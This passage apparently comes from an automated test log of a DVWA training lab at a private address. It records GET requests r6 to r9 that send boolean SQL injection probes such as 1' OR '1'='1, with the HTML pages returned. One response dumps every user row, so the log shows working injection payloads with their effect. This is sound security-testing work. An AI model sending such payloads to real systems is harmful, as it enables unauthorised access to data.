+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1 AND 1=1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vu</pre></details><details><summary>Transcript r6: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+AND+1%3D2&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1 AND 1=2&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vu</pre></details><details><summary>Transcript r7: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: Gordon&lt;br /&gt;Surname: Brown&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: Hack&lt;br /&gt;Surname: Me&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: Pablo&lt;br /&gt;Surname: Picasso&lt;/pre&gt;&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;1&lt;br /&gt;First name: Bob&lt;br /&gt;Surname: Smith&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.c</pre></details><details><summary>Transcript r8: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%272&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; OR &#x27;1&#x27;=&#x27;2&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../..</pre></details><details><summary>Transcript r9: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D1&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
